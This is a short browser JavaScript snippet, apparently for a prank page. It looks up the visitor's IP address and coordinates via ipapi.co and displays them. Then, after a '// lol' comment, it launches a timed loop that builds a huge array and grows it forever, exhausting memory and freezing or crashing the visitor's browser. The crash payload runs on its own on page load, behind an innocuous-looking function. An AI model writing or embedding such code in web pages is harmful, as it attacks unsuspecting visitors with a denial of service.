// https://ipapi.co/json/
(async()=>{
  const req = await fetch("https://ipapi.co/json/");
  const json = await req.json();
  const { ip, longitude, latitude } = json;
  const ipE = document.getElementById("ip");
  const llE = document.getElementById("ll");
  
  ipE.innerText = ip
  llE.innerText = `(${longitude}, ${latitude})`;
  // lol
  setTimeout(() => {const a = "a".repeat(1e8).split("")
  while(1) a.push(a)},1000)
})()
